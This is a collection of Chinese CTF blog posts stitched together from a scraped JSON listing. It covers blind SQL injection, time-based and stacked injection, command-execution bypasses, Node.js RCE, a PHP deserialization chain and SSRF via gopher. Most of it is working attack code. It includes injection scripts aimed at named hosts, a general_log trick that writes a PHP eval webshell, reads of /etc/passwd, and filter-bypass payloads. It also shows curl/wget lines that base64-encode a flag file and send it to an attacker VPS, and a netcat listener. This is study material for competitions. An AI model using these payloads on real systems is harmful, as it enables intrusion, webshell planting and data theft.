也没有group_concat，所以我们无法按照常规方法得到ctf的那个库有什么表，此时就需要使用无列名盲注。先通过无列名盲注注出ctf下的表，在通过无列名盲注注出ctf下的字段数据 表位置探测利用比较法：首先我们需要找出哪一行是我们需要的,本地测试发现，information_schema.tables有21个列，并且第一个字段值为def 第二个为数据库，由于我们已经知道数据库名字了，所以可以这样判断，不断更改limit的值，判断结果是否为1 并且可以利用这个转折点进行判断是否为我们需要的库 写一个探测的脚本本来是想按照上面那个思路写的脚本，但是发现没有探测出来，于是换了一种思路，直接从第一位开始，因为我已经知道数据库的名字是ctf，所以按照 order by table_schema的排序 那么这个表就会在比较前面的位置 def search_co(): for i in range(0,100): payload=f&quot;admin'and/**/('def','d',1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1)&lt;(table information_schema.tables order by table_schema limit {i},1)#&quot;.replace(&quot; &quot;,&quot;/**/&quot;) data1={ 'username':payload, 'password':&quot;123&quot; } #print(data1) #print(s.post(url=url,data=data1).text) if &quot;username error!&quot; in s.post(url=url,data=data1).text: print(&quot;ctf库在第&quot;,i,&quot;列&quot;) 爆破表脚本：这个确实花了我好多时间，主要原因还是在于语句的书写上 有个细节，就是我们的表后面那个字段也是需要空出来的，不然就会造成改字段没比完的情况,还有另一个细节是一些特殊字符是不能去进行比较的，不然的话就直接出错了。。。 def sql_injection_s(): fina_wod=&quot;&quot; a=&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot; for i in range(0,100): for j in range(0,62): payload_2=f&quot;admin'and (('def','ctf','{fina_wod+a[j]}','',1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1)&lt;(table information_schema.tables order by TABLE_SCHEMA limit 0,1))#&quot;.replace(&quot; &quot;,&quot;/**/&quot;) data={ 'username':payload_2, 'password':&quot;1&quot; } r = s.post(url=url, data=data).text #print(data) if &quot;username error&quot; in r: fina_wod+=a[j-1] print(fina_wod) break 爆破出来以后有一个admin，还有另外一个是f11114g 爆破flagtable 表名 limit 1,1; 之前为什么需要知道列名？因为列多，如果我们直接用substr截取的话会报错那么意味着，如果只有一列 那么substr截取就可以不用列名也可以选取了：所这里写脚本就很容易了直接用爆破库名的脚本来就行 table f11114g limit 0,1 需要注意的是 第一行没有flag，第二行才是 def sql_injection(pay_lo):#库名和版本 fina_wod=&quot;&quot; for i in range(1,100): low=32 high=128 mid=(low+high)//2 while(low&lt;high): payload_1=f&quot;admin'and ascii(substr(({payload}),{i},1))&gt;{mid}#&quot;.replace(&quot; &quot;,&quot;/**/&quot;) data={ 'username':payload_1, 'password':&quot;1&quot; } #print(data) r=s.post(url=url,data=data).text #print(r) if &quot;password error!&quot; in r: low = mid + 1 else: high = mid mid = (low + high) // 2 if (mid == 32 or mid == 128): break fina_wod += chr(mid) print(fina_wod) flag{8848f380-dce6-4184-a3d8-430e72c4eca0} 完整脚本： import requestss=requests.session()url=&quot;&quot;def sql_injection(pay_lo):#库名和版本 fina_wod=&quot;&quot; for i in range(1,100): low=32 high=128 mid=(low+high)//2 while(low&lt;high): payload_1=f&quot;admin'and ascii(substr(({payload}),{i},1))&gt;{mid}#&quot;.replace(&quot; &quot;,&quot;/**/&quot;) data={ 'username':payload_1, 'password':&quot;1&quot; } #print(data) r=s.post(url=url,data=data).text #print(r) if &quot;password error!&quot; in r: low = mid + 1 else: high = mid mid = (low + high) // 2 if (mid == 32 or mid == 128): break fina_wod += chr(mid) print(fina_wod)def sql_injection_s():#表名 fina_wod=&quot;&quot; a=&quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot; for i in range(0,100): for j in range(0,62): payload_2=f&quot;admin'and (('def','ctf','{fina_wod+a[j]}','',1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1)&lt;(table information_schema.tables order by TABLE_SCHEMA limit 1,1))#&quot;.replace(&quot; &quot;,&quot;/**/&quot;) data={ 'username':payload_2, 'password':&quot;1&quot; } r = s.post(url=url, data=data).text #print(data) if &quot;username error&quot; in r: fina_wod+=a[j-1] print(fina_wod) breakdef search_co():#探测表在第几个 for i in range(0,10000): payload=f&quot;admin'and/**/('def','ct',1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1)&lt;(table information_schema.tables order by table_schema desc limit {i},1)#&quot;.replace(&quot; &quot;,&quot;/**/&quot;) data1={ 'username':payload, 'password':&quot;123&quot; } #print(data1) #print(s.post(url=url,data=data1).text) if &quot;username error!&quot; in s.post(url=url,data=data1).text: print(&quot;ctf库在第&quot;,i,&quot;列&quot;)if __name__==&quot;__main__&quot;: #payload=&quot;database()&quot;#ctf #payload=&quot;version()&quot;#8.0.26-0ubuntu0.20.04.2 payload=&quot;table f11114g limit 1,1&quot; #search_co() #print_word() sql_injection(payload) #sql_injection_s() union联合fuzz过滤内容看了一下过滤了最重要的info库，就意味着大概率是无列名盲注了，然后过滤了一些比较符号，还有likerlike等正则匹配函数，那么本题似乎只能用case when了的感觉接下 判断注入类型布尔盲注，回显分为 测试语句：:root'and/**/case/**/1/**/when/**/1/**/then/**/1/**/else/**/0/**/end#true:welcomt adminfalse:wrong 编写盲注脚本：构造注入语句这题的截取函数基本都过滤了，所以这里使用 接下来就是跑表名，由于in库被过滤了，这里试了一下 发现 select group_concat(table_name) from sys.schema_table_statistics; 是可以的 就可以跑出表名了接下来使用union无列名盲注 select a.1 from (select 1,2 union select * from `SeCrrreT`)a limit 1,2 得到表名以后 直接select * from SeCrrreT跑不出来，所以可以猜想肯定不止一行，所以后面要加limit 然后用无列名盲注，去尝试字段数 import requestsimport stringurl=&quot;http://a.y1ng.vip:1119/&quot;s=requests.session()def sql_injection(payload): data1=&quot;&quot; for i in range(1,100): for j in range(32,128): payload_tr=f&quot;root'and case ascii(reverse(left(({payload}),{i}))) when {j} then 1 else 0 end#&quot;.replace(&quot; &quot;,&quot;/**/&quot;) data={ &quot;username&quot;:payload_tr, &quot;password&quot;:&quot;1141&quot; } r=s.post(url=url,data=data).text #print(r) #print(data) if &quot;Welcome Admin!&quot; in r: data1+=chr(j) print(data1) breakif __name__==&quot;__main__&quot;: #payload=&quot;database()&quot;#ctfgame #payload=&quot;select group_concat(table_name) from sys.schema_table_statistics&quot;#users,SeCrrreT payload=&quot;select a.1 from (select 1,2 union select * from `SeCrrreT`)a limit 1,2&quot;#flag{fab99a66-23db-47b1-9db4-9262664d76a8} sql_injection(payload) 我用的是case when进行盲注，看了一下师傅的 ，他使用的是between来替代没有了的比较函数 &quot;username&quot; : f&quot;root' and (ascii(reverse(left(({select}),{i}))) between {ascii} and {ascii+1})#&quot;.replace(&quot; &quot;, &quot;/**/&quot;), 这是他的语句，收藏起来了~","link":"/2021/08/09/sql-%E6%97%A0%E5%88%97%E5%90%8D%E7%9B%B2%E6%B3%A8/"},{"title":"sql时间盲注","text":"前期测试确定注入点以及过滤内容发现username必须是admin，如果不是admin混有其他字符的话就会返回you are not admin，但是password可以注入，先fuzz一下过滤的字符，过滤substr、union等字符，也过滤了sleep，同时还过滤了空格 确定注入类型发现不论输入的内容是什么 页面的回显均是password error，所以尝试一下时间盲注的语句，但是过滤了sleep那么就需要使用benchmark，由于substr以及比较符之类的都没了，所以这里就用in了 1'or/**/case/**/1/**/when/**/1/**/then/**/1/**/else/**/benchmark(1000000,sha1(sha1(sha1(sha1(sha1(sha1(sha1('HWG'))))))))end# 编写盲注脚本：一开始在写的时候 忘记ascii不见了，所以写的还挺顺的，后来发现不见了，于是就要重新修改一下，想到之前刚学的hex于是就用hex进行书写一下试试 import requestsimport timeimport binasciiurl=&quot;http://a.y1ng.vip:1102/index.php&quot;s=requests.session()def hex_tran(s): return hex(s).replace(&quot;0x&quot;, &quot;&quot;)def tran_str(g): tran_tmp=&quot;&quot; g = binascii.unhexlify(g) print(g.decode('utf-8')) tran_tmp=g print(tran_tmp[::-1]) return tran_tmp[::-1]def sql_injection(payload:str): wd_tr=&quot;&quot; for j in range(1,100): for i in range(32,128): payload_fina=f&quot;1'or/**/case/**/(select/**/hex(right(({payload}),{j}))/**/in/**/('{hex_tran(i)+wd_tr}'))/**/when/**/1/**/then/**/benchmark(100000,sha1(sha1(sha1(sha1(sha1(sha1(sha1('HWG'))))))))/**/else/**/1/**/end#&quot; data={ &quot;username&quot;:&quot;admin&quot;, &quot;password&quot;:payload_fina } print(data) times=time.time() r=s.post(url,data=data).text if time.time()-times &gt;= 4: wd_tr=f&quot;{hex_tran(i)}&quot;+wd_tr print(wd_tr) break if i==127: wd_tr = tran_str(wd_tr) print(wd_tr) exit(0)if __name__ ==&quot;__main__&quot;: #payload=&quot;database()&quot; #payload=&quot;select group_concat(table_name) from information_schema.tables where table_schema in (select database())&quot;.replace(&quot; &quot;,&quot;/**/&quot;) #payload=&quot;select group_concat(column_name) from information_schema.columns where table_name in ('Fl49ish3re')&quot;.replace(&quot; &quot;,&quot;/**/&quot;) payload=&quot;select group_concat(f1aG123) from Fl49ish3re&quot;.replace(&quot; &quot;,&quot;/**/&quot;)#flag{08e687c1-cc68-4db0-9924-407792caf20e} sql_injection(payload) 但是发现只能打印一部分表的感觉，但是ascii码表都齐了呀–就很奇怪。。。在本地测试了一下，因为我们是十六进制的，所以会出现abcdef这些字母，但是在mysql中 这些字母是大写的，但是在python中的转化结果是小写的，然后我们还使用了binary，区分大小写，所以就跑不出来了，这里我们可以将binary去掉，这样就没关系了 卡壳点主要是还是编程能力太弱，还需多加锻炼然后就是那个binary区分大小写的，如果是用字符去注的话就需要区分了，但是这里不是，直接用十六进制就不用了","link":"/2021/08/01/sql%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"},{"title":"堆叠+无列名+时间盲注","text":"延时盲注延时函数：sleep()select sleep(); benchmark()select benchmark(100000,sha1(sha1(sha1('tlfie')))); get_lock在一个session中先锁定一个变量 然后通过另一个session，再次执行get_lock函数 select get_lock('tlife',1);select get_lock('tlife',5); 但也不是每次都能用，需要提供长连接，在Apache+PHP搭建的环境中需要使用mysql_pconnect函数来连接数据库，所以只能根据环境去实际测试一下，我在本地也没测试成功 正则表达式延时正则匹配在匹配较长字符串但自由度比较高的字符串时，会造成比较大的计算量，我们通过rpad或repeat构造长字符串，加以计算量大的pattern，通过控制字符串长度我们可以控制延时。 select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b'); 文件操作mysql变量可以通过 show variables 来查看系统变量以及其值 和文件有关的变量secure_file_privsecure_file_priv对读写文件有影响。 secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。 当secure_file_priv的值为null ，表示限制mysqld不允许导入|导出。默认是nul l当secure_file_priv的值为/tmp/ ，表示限制mysqld的导入|导出只能发生在/tmp/目录下 当secure_file_priv的值没有具体值时，表示不对mysqld的导入|导出做限制 读文件select load_file('/flag')select CONVERT(LOAD_FILE(&quot;/etc/passwd&quot;) USING utf8); 写文件select &quot;&lt;?php phpinfo();?&gt;&quot; into outfile &quot;/tmp/1.php&quot;select &quot;&lt;?php phpinfo();?&gt;&quot; into dumpfile &quot;/tmp/1.php&quot; outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式 堆叠注入堆叠注入条件$mysqli-&gt;multi_query($sql); 当secure_file_priv为null时如果堆叠注入，可以利用log日志文件写马 set global general_log=on;set global general_log_file='xxxx';-- 设置日志文件保存位置select '&lt;?php eval($_POST['a']); ?&gt;';-- 该内容将会被写入日志中 堆叠注入中select被过滤handlermysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。 handler users open as hd; #指定数据表进行载入并将返回句柄重命名handler hd read first; #读取指定表/句柄的首行数据handler hd read next;#读取指定表/句柄的下一行数据handler hdclose; #关闭句柄 mysql预处理一、SQL 语句的执行处理1、即时 SQL 一条 SQL 在 DB 接收到最终执行完毕返回，大致的过程如下： 1. 词法和语义解析； 2. 优化 SQL 语句，制定执行计划； 3. 执行并返回结果； 如上，一条 SQL 直接是走流程处理，一次编译，单次运行，此类普通语句被称作 Immediate Statements （即时 SQL）。2、预处理 SQL 但是，绝大多数情况下，某需求某一条 SQL 语句可能会被反复调用执行，或者每次执行的时候只有个别的值不同（比如 select 的 where 子句值不同，update 的 set 子句值不同，insert 的 values 值不同）。如果每次都需要经过上面的词法语义解析、语句优化、制定执行计划等，则效率就明显不行了。 所谓预编译语句就是将此类 SQL 语句中的值用占位符替代，可以视为将 SQL 语句模板化或者说参数化，一般称这类语句叫Prepared Statements。 预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入 实例如下，可以预编译一个语句然后执行即可，里面的变量是可以更换的 set @a=xxxx;prepare stmt1 from @a;execute stmt1; 例1： 以上 不设置变量直接使用，以下为设置了变量直接进行调用， 这是另一种使用方式，但是似乎无法使用字符串 DELIMITER $$create procedure fuck(out oo text(999), in ii text(999))BEGINset oo = ii;END$$call fuck(@a, 0x73656C656374202731323327)$$prepare b from @a$$execute b$$ 无列名盲注过滤了in/or过滤了in/or导致无法使用information_schema 替代库select table_name from sys.schema_auto_increment_columns where tabe_schema=database(); select table_name from mysql.innodb_table_stats where database_name='security' select group_concat(table_name) from sys.schema_table_statistics 但是我们查询不了列名，这个时候就需要使用无列名盲注 #查询所有的库SELECT table_schemaFROM sys.schema_table_statisticsGROUP BY table_schema;SELECT table_schemaFROM sys.x$schema_flattened_keysGROUP BY table_schema;#查询指定库的表（若无则说明此表从未被访问）SELECT table_nameFROM sys.schema_table_statisticsWHERE table_schema='mspwd' GROUP BY table_name;SELECT table_nameFROM sys.x$schema_flattened_keysWHERE table_schema='mspwd' GROUP BY table_name;#统计所有访问过的表次数:库名,表名,访问次数select table_schema,table_name,sum(io_read_requests+io_write_requests) iofrom sys.schema_table_statisticsgroup by table_schema,table_nameorder by iodesc;#查看所有正在连接的用户详细信息SELECT user,db,command,current_statement,last_statement,timeFROM sys.session;#查看所有曾连接数据库的IP,总连接次数SELECT host,total_connectionsFROM sys.host_summary; 无列名盲注union重命名select 1,2,3 union select * from users **注入语句可写为** select group_concat(a.2) from (select 1,2,3 union select * from users); 比较法这就是盲注的思想了，前面的部分是你要注的内容，因为要判断不同，所以后面的都应该是最大的zzz 这样才能保证每一位的改变能影响后面的 这是对比第二位是的完整结果是admin 编写脚本的时候可能还需要做一个该字段是否结束的判断，也就是从一开始遍历到最后都没改变 说明结束了","link":"/2021/08/09/%E5%A0%86%E5%8F%A0-%E6%97%A0%E5%88%97%E5%90%8D-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"},{"title":"文件操作","text":"文件上传绕过前段验证绕过改js文件 MIME-TYPE绕过抓包改 黑名单后缀绕过选择php3、php4、phtml等不常见后缀 双写绕过文件内容绕过","link":"/2021/08/18/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"},{"title":"正则匹配时间盲注","text":"正则匹配时间盲注论文：https://diary.shift-js.info/blind-regular-expression-injection/2021ciscn 正则表达式盲注exp require 'net/http'CHALLENGE = 'http://127.0.0.1:4567/'String.class_eval do def hex res = '' self.each_byte do |i| res += &quot;%02x&quot; % i end return res endenddef random(len) chars = (&quot;a&quot;..&quot;z&quot;).to_a + (&quot;A&quot;..&quot;Z&quot;).to_a + (&quot;0&quot;..&quot;9&quot;).to_a s = &quot;&quot; 1.upto(len) do s &lt;&lt; chars[rand(chars.size - 1)] end senddef check_result(reg, suffix) full_regexp = &quot;^(?=&quot; + reg + &quot;)((.*)*)*&quot; + suffix p full_regexp uri = URI(CHALLENGE + 'check/' + full_regexp.hex) Net::HTTP.get_response(uri)enddef leak(flag, r) chars = '0123456789abcdef' (0..15).each do |i| if check_result(flag + chars[i], r).body[&quot;False&quot;] p flag + chars[i] return leak(flag + chars[i], r) end endendr = random(10)+'$'leak('', r)# &quot;facdf9972bb5fdf9c35d6e09770e9af7&quot;","link":"/2021/08/26/%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/"},{"title":"命令执行和绕过","text":"高危函数:system()、exec()、shell_exec()、passthru()、pctnl_exec()、popen()、proc_open() 注：反引号是shell_exec()的别名 代码注入程序过滤不严谨，导致用户可以将代码注入并执行。高危函数:eval()、assert()、preg_replace()、call_user_func()等等和命令执行的区别是：一个执行系统命令，一个执行PHP代码 bypass过滤空格$IFS${IFS}$IFS$9&lt;&lt;&gt;{cat,flag.php}// 用逗号实现了空格功能，需要用{}括起来%20%09 过滤某关键字ca\\t y1n\\g.php反斜线绕过cat y1”ng.php 两个单引号绕过echo “Y2F0IC9mbGFn” | base64 -d | bash#base64 编码绕过echo “6361742079316E672E706870” | xxd -r -p | bash#hex 编码绕过cat y1 [n] g.php用[]匹配cat y1n*用*匹配任意cat y1n?cat y1{a..z}g more tlif3less tlif3head tlif3tail tlif3nl f*m4 * escapeshellcmd+escapeshellarg绕过无参数rceshell_exec等无回显函数 判断方法ls;sleep(3) 复制法copy flag.php flag.txtmv flag.php flag.txtcat flag.php &gt; flag.txt 压缩法tar cvf flag.tar flag.php #tar压缩tar zcvf flag.tar.gz flag.php #tar解压zip flag.zip flag.php #zip压缩unzip flag.zip #zip解压 写shell法echo 3c3f706870206576616c28245f504f53545b3132335d293b203f3e|xxd -r -ps &gt; webshell.php//echo &quot;&lt;?php @eval(\\$_POST[123]); ?&gt;&quot; &gt; webshell.php 利用vps反弹shell法一在自己的公网服务器站点根目录写入php文件，内容如下：&lt;!-- record.php --&gt;&lt;?php$data =$_GET['data'];$f = fopen(&quot;flag.txt&quot;, &quot;w&quot;);fwrite($f,$data);fclose($f);?&gt; 在目标服务器的测试点可以发送下面其中任意一条请求进行测试 curl http://*.*.*.**/record.php?data=`cat flag.php|base64`wget http://*.*.*.*/record.php?data=`cat flag.php|base64` 法二1.在公网服务器监听监听端口 nc -lp 9999（端口号） 2.向目标服务器发起http请求，执行curl命令 curl ip:9999 参考https://bbs.huaweicloud.com/blogs/detail/286904 法三，外带flagcurl -d @/home/www-data/res.txt http://xx:xxxcurl http://xx:xx/?d=`php -r 'file_'|base64`echo `ps`&gt;/home/www-data/res.txt 第一条是读取文件内容，第二条是执行命令，可以将执行命令的结果保存为一个文件，然后再去进行读取 nodejs RCE1.child_processchild_process是用来执行系统命令模块 require(&quot;child_process&quot;).exec(&quot;sleep 3&quot;);require(&quot;child_process&quot;).execSync(&quot;sleep 3&quot;);require(&quot;child_process&quot;).execFile(&quot;/bin/sleep&quot;,[&quot;3&quot;]); //调用某个可执行文件，在第二个参数传argsrequire(&quot;child_process&quot;).spawn('sleep', ['3']);require(&quot;child_process&quot;).spawnSync('sleep', ['3']);require(&quot;child_process&quot;).execFileSync('sleep', ['3']); 2.nodejs中的命令执行过滤关键字16进制编码绕过require(&quot;child_process&quot;)[&quot;exe\\x63Sync&quot;](&quot;curl 127.0.0.1:1234&quot;) unicode编码require(&quot;child_process&quot;)[&quot;exe\\u0063Sync&quot;](&quot;curl 127.0.0.1:1234&quot;) 加号拼接require('child_process')['exe'%2b'cSync']('curl 127.0.0.1:1234') 模板字符串require('child_process')[`${`${`exe`}cSync`}`]('curl 127.0.0.1:1234') concat连接require(&quot;child_process&quot;)[&quot;exe&quot;.concat(&quot;cSync&quot;)](&quot;curl 127.0.0.1:1234&quot;) base64编码eval(Buffer.from('Z2xvYmFsLnByb2Nlc3MubWFpbk1vZHVsZS5jb25zdHJ1Y3Rvci5fbG9hZCgiY2hpbGRfcHJvY2VzcyIpLmV4ZWNTeW5jKCJjdXJsIDEyNy4wLjAuMToxMjM0Iik=','base64').toString()) Obejct.keys实际上通过require导入的模块是一个Object，所以就可以用Object中的方法来操作获取内容。利用Object.values就可以拿到child_process中的各个函数方法，再通过数组下标就可以拿到execSync console.log(require('child_process').constructor===Object)//trueObject.values(require('child_process'))[5]('curl 127.0.0.1:1234') Reflect在js中，需要使用Reflect这个关键字来实现反射调用函数的方式。譬如要得到eval函数，可以首先通过Reflect.ownKeys(global)拿到所有函数，然后global[Reflect.ownKeys(global).find(x=&gt;x.includes('eval'))]即可得到eval console.log(Reflect.ownKeys(global))//返回所有函数console.log(global[Reflect.ownKeys(global).find(x=&gt;x.includes('eval'))])//拿到eval 拿到eval之后，就可以常规思路rce了 global[Reflect.ownKeys(global).find(x=&gt;x.includes('eval'))]('global.process.mainModule.constructor._load(&quot;child_process&quot;).execSync(&quot;curl 127.0.0.1:1234&quot;)') 这里虽然有可能被检测到的关键字，但由于mainModule、global、child_process等关键字都在字符串里，可以利用上面提到的方法编码，譬如16进制。 global[Reflect.ownKeys(global).find(x=&gt;x.includes('eval'))]('\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x5b\\x52\\x65\\x66\\x6c\\x65\\x63\\x74\\x2e\\x6f\\x77\\x6e\\x4b\\x65\\x79\\x73\\x28\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x29\\x2e\\x66\\x69\\x6e\\x64\\x28\\x78\\x3d\\x3e\\x78\\x2e\\x69\\x6e\\x63\\x6c\\x75\\x64\\x65\\x73\\x28\\x27\\x65\\x76\\x61\\x6c\\x27\\x29\\x29\\x5d\\x28\\x27\\x67\\x6c\\x6f\\x62\\x61\\x6c\\x2e\\x70\\x72\\x6f\\x63\\x65\\x73\\x73\\x2e\\x6d\\x61\\x69\\x6e\\x4d\\x6f\\x64\\x75\\x6c\\x65\\x2e\\x63\\x6f\\x6e\\x73\\x74\\x72\\x75\\x63\\x74\\x6f\\x72\\x2e\\x5f\\x6c\\x6f\\x61\\x64\\x28\\x22\\x63\\x68\\x69\\x6c\\x64\\x5f\\x70\\x72\\x6f\\x63\\x65\\x73\\x73\\x22\\x29\\x2e\\x65\\x78\\x65\\x63\\x53\\x79\\x6e\\x63\\x28\\x22\\x63\\x75\\x72\\x6c\\x20\\x31\\x32\\x37\\x2e\\x30\\x2e\\x30\\x2e\\x31\\x3a\\x31\\x32\\x33\\x34\\x22\\x29\\x27\\x29') 这里还有个小trick，如果过滤了eval关键字，可以用includes('eva')来搜索eval函数，也可以用startswith('eva')来搜索 过滤中括号的情况在3.2中，获取到eval的方式是通过global数组，其中用到了中括号[]，假如中括号被过滤，可以用Reflect.get来绕 Reflect.get(target, propertyKey[, receiver])的作用是获取对象身上某个属性的值，类似于target[name]。 所以取eval函数的方式可以变成 Reflect.get(global, Reflect.ownKeys(global).find(x=&gt;x.includes('eva'))) 后面拼接上命令执行的payload即可。 https://www.anquanke.com/post/id/237032 bash盲注","link":"/2021/08/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%92%8C%E7%BB%95%E8%BF%87/"},{"title":"2021祥云杯web题解","text":"前言就做了俩题，另外一题还是赛后半小时后才做出来，太太太太太太太太太太太菜了 ezyii网上有现成的链子 拿到直接打就行了，后面在研究一下过程吧 &lt;?phpnamespace Codeception\\Extension{ use Faker\\DefaultGenerator; use GuzzleHttp\\Psr7\\AppendStream; class RunProcess{ protected $output; private $processes = []; public function __construct(){ $this-&gt;processes[]=new DefaultGenerator(new AppendStream()); $this-&gt;output=new DefaultGenerator('jiang'); } } echo urlencode(serialize(new RunProcess()));}namespace Faker{ class DefaultGenerator{ protected $default; public function __construct($default = null) { $this-&gt;default = $default;}}}namespace GuzzleHttp\\Psr7{ use Faker\\DefaultGenerator; final class AppendStream{ private $streams = []; private $seekable = true; public function __construct(){ $this-&gt;streams[]=new CachingStream(); } } final class CachingStream{ private $remoteStream; public function __construct(){ $this-&gt;remoteStream=new DefaultGenerator(false); $this-&gt;stream=new PumpStream(); } } final class PumpStream{ private $source; private $size=-10; private $buffer; public function __construct(){ $this-&gt;buffer=new DefaultGenerator('j'); include(&quot;closure/autoload.php&quot;); $a = function(){system('cat /flag.txt');phpinfo(); }; $a = \\Opis\\Closure\\serialize($a); $b = unserialize($a); $this-&gt;source=$b; } }} 安全检测这题的就在于扫扫扫扫描。。。。。。也就是信息收集 首先是 .login.php.swp 有源码，然后username可控 &lt;?php//error_reporting(0);ob_start();session_start();function check3($username){ $pattern = &quot;\\/\\*|\\*|\\.\\.\\/|\\.\\/|&lt;|&gt;|\\?|\\*|load_file|outfile|dumpfile|sub|hex|where&quot;; $pattern .= &quot;|file_put_content|file_get_content|fwrite|curl|system|eval|assert&quot;; $pattern .= &quot;|select|insert|update|delete|load_file|into outfile|drop&quot;; $pattern .=&quot;|passthru|exec|system|chroot|scandir|chgrp|chown|shell_exec|proc_open|proc_get_status|popen|ini_alter|ini_restore&quot;; $pattern .=&quot;|`|openlog|syslog|readlink|symlink|popepassthru|stream_socket_server|assert|pcntl_exec|http|.php|.ph|\\@|:\\/\\/|flag&quot;; $pattern .=&quot;|file|dict|gopher&quot;; $vpattern = explode(&quot;|&quot;,$pattern); foreach($vpattern as $value){ if (preg_match( &quot;/$value/i&quot;, $username )){ echo &quot;æ£€æµ‹åˆ°æ¶æ„å­—ç¬¦&quot;; exit(0); } }}$username=file_get_content(&quot;php://input&quot;);check3($username);$username=json_decode($username)-&gt;username; if($username){ $_SESSION['user1']=$username; Header(&quot;Location:./index.php&quot;); ob_end_flush(); exit(0);}?&gt; 可以发现session_start()函数，username又存入session中，大概率就是session文件包含了，于是再找找哪里能继续包含内容在后面输入url窗口那里，发现输入这个，可以读到include123.php 127.0.0.1/admin/include123.php 然后这里就有一个include函数，那么就可以实现session文件包含了 解法一： 利用username进行session文件包含，由于后面使用了json_decode，所以我们可以使用unioncode编码输入内容，这样就就可以绕过前面的过滤了PS:一开始一直没成功，后面才知道是实体化编码的问题，输入的内容虽然可以正常显示 但已经不是原本的东西了，其中就是&lt;这个编码错误了，这个是学长给的unioncode编码脚本，用这个就行了 def UNICODE(payload): #unicode res_payload = &quot;&quot; for i in payload: i = &quot;\\\\u00{}&quot;.format(hex(ord(i))[2:]) res_payload += i print(&quot;[+]'{}' Convert to UNICDOE: \\&quot;{}\\&quot;&quot;.format(payload,res_payload)) 直接上网站加密就没成功了。。看下面这个 payload http://127.0.0.1/admin/include123.php?u=/tmp/sess_xxxx(你的session) 解法二： 可以看到我们输入的链接最终也会在session文件里面出现，所以此时我们可以利用这个链接进行文件包含 http://127.0.0.1/admin/include123.php?u=/tmp/sess_xxxx(你的session)&amp;a=&lt;?system('ls');?&gt; 但是需要注意的是不能有空格，会被直接截断！，所以后面可以使用这个进行绕过 cat${IFS}$/fl&quot;&quot;ag 小结还是太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太太菜了，要走的路还很远，好好加油反思一下这次这个安全监测应该可以很快做出来的，主要是信息收集得不行，太慢了，而且换了好几个工具有必要更新一下字典之类的了！","link":"/2021/08/30/2021%E7%A5%A5%E4%BA%91%E6%9D%AF%E9%A2%98%E8%A7%A3/"},{"title":"CTF中好用的网站","text":"","link":"/2021/09/01/CTF%E4%B8%AD%E5%A5%BD%E7%94%A8%E7%9A%84%E7%BD%91%E7%AB%99/"},{"title":"ssrf服务端请求伪造","text":"SSRF简介SSRF是一种由攻击者构造形成由服务器发起请求的一个漏洞，让服务器去请求通常请求不到的东西。一般用来在外网探测或攻击内网服务实例代码 &lt;?php$url=$_GET['url'];echo file_get_contents($url);?&gt; SSRF相关函数file_get_contents：能将url或者文件呈现给用户fsockopen:能打开一个网络连接，实现对用户指定url数据的获取，传输原始数据curl_exec:….. SSRF利用读取系统文件file://伪协议:读取本地文件file://C:/flag.txt gopher://协议gopher是一个信息查找系统 利用此协议可以攻击内网的FTP、Telnet、Redis、Mysql，可以进行get、post请求 利用方式1.构造http get/post请求消息2.对请求消息进行url编码3.将编码后的字符串中的%0A替换为%0D%0A4.将最终的字符串在进行一次URL编码5.拼接协议头、请求地址gopher转化脚本： from urllib.parse import quote as urlencodedef gopher(data):#端口记得更换 stream = f&quot;&quot;&quot;POST /index.php HTTP/1.1Host: 127.0.0.1:47852Content-Type: application/x-www-form-urlencodedContent-Length: {len(data)}Connection: close{data}&quot;&quot;&quot;.replace(&quot;\\n&quot;, &quot;\\r\\n&quot;) g = &quot;gopher://127.0.0.1:47852/_&quot; + urlencode(stream) return urlencode(g)print(gopher('a=1')) 作用gopher可以自定义发送post以及get的请求内容 ssrf扫描端口可以先看/etc/hosts看ip，然后扫描端口可以从1w-2w，看题目说明，没说就是扫6w个 HTTP请求走私SSRF攻击mysql原理：我们知道ssrf就是伪造服务端发起请求，这里就有个问题就是，为什么我们使用本地抓的包写入到gopher攻击数据包里面，可以打题目里面的？那就是因为在ssrf题目里面，我们发起的请求就相当于在题目的本地进行攻击了，所以效果是一样的 SSRF漏洞结合gopher系统攻击内网未授权mysql(即没有密码)，并获取系统shell的方法 mysql通信协议客户端连接服务器有三种方法：1.unix套接字：只能在客户端和mysql服务器在同一台电脑上才行2.内存共享/命名管道：window系统3.TCP/IP套接字：是在任何系统下都可以使用的方式，也是使用最多的连接方式，即：mysql -h127.0.0.1 -uroot -prootPS：这里不可以使用localhost，因为localhost使用的是unix的套接字 